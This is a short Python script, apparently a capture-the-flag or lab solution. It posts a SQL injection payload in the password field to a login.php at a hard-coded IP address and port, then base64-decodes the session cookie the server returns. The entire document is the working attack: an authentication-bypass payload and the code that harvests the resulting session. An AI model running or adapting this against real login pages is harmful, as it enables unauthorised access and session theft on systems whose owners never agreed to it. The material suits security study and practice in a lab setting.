import requests
import base64

url="http://104.154.106.182:9090/login.php"

data = {"username":"a","password":"a'or''='","submit":"submit"}

r = requests.post(url,data=data)

sessionid = r.headers["Set-Cookie"][10:-3]
sessionid+="="

print(str(base64.b64decode(sessionid.encode('utf-8')),'utf-8'))
